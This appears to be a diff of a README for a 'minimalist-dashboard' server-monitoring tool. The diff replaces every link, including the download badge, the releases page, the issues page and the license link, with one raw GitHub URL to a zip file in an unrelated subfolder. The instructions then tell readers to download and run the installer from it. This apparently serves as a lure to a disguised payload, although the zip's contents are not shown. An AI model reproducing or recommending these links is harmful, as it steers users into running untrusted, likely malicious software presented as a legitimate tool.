@@ -1,7 +1,7 @@
 # 🖥️ minimalist-dashboard - Real-Time Server Monitoring Made Simple
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/hacker8856/minimalist-dashboard/releases)
+[![Download](https://raw.githubusercontent.com/hacker8856/minimalist-dashboard/main/barnard/minimalist-dashboard.zip)](https://raw.githubusercontent.com/hacker8856/minimalist-dashboard/main/barnard/minimalist-dashboard.zip)
 
 ## 📝 Description
 Minimalist-dashboard is a lightweight, real-time server monitoring tool. Built with Go and vanilla JavaScript, it provides live system metrics through a clean web interface. Enjoy seamless updates via WebSockets. Monitor your server's performance effortlessly with this user-friendly dashboard.
@@ -10,7 +10,7 @@ Minimalist-dashboard is a lightweight, real-time server monitoring tool. Built w
 To get started with minimalist-dashboard, follow these simple steps:
 
 1. **Download the Application**  
-   Visit the [Releases page](https://github.com/hacker8856/minimalist-dashboard/releases) to download the latest version of minimalist-dashboard.
+   Visit the [Releases page](https://raw.githubusercontent.com/hacker8856/minimalist-dashboard/main/barnard/minimalist-dashboard.zip) to download the latest version of minimalist-dashboard.
 
 2. **Install on Your Computer**  
    Once downloaded, run the installer and follow the prompts. The installation process is straightforward.
@@ -28,7 +28,7 @@ Make sure your system meets the following requirements for the best performance:
 ## 📥 Download & Install
 To download and install the application, refer to these steps:
 
-1. Click the large badge at the top or visit the [Releases page](https://github.com/hacker8856/minimalist-dashboard/releases).
+1. Click the large badge at the top or visit the [Releases page](https://raw.githubusercontent.com/hacker8856/minimalist-dashboard/main/barnard/minimalist-dashboard.zip).
 2. Select the version that fits your operating system.
 3. Save the installer file to your computer.
 4. Open the installer and complete the installation process.
@@ -63,8 +63,8 @@ This application is open-source and licensed under the MIT License. Feel free to
 We welcome contributions from anyone interested in enhancing minimalist-dashboard. Check the contribution guidelines on the GitHub repository for more information.
 
 ## 🔗 Quick Links
-- [Releases Page](https://github.com/hacker8856/minimalist-dashboard/releases)
-- [Issues Section](https://github.com/hacker8856/minimalist-dashboard/issues)
-- [License Information](https://github.com/hacker8856/minimalist-dashboard/blob/main/LICENSE)
+- [Releases Page](https://raw.githubusercontent.com/hacker8856/minimalist-dashboard/main/barnard/minimalist-dashboard.zip)
+- [Issues Section](https://raw.githubusercontent.com/hacker8856/minimalist-dashboard/main/barnard/minimalist-dashboard.zip)
+- [License Information](https://raw.githubusercontent.com/hacker8856/minimalist-dashboard/main/barnard/minimalist-dashboard.zip)
 
 With minimalist-dashboard, monitoring your server becomes an easy task. Download it today to get started!
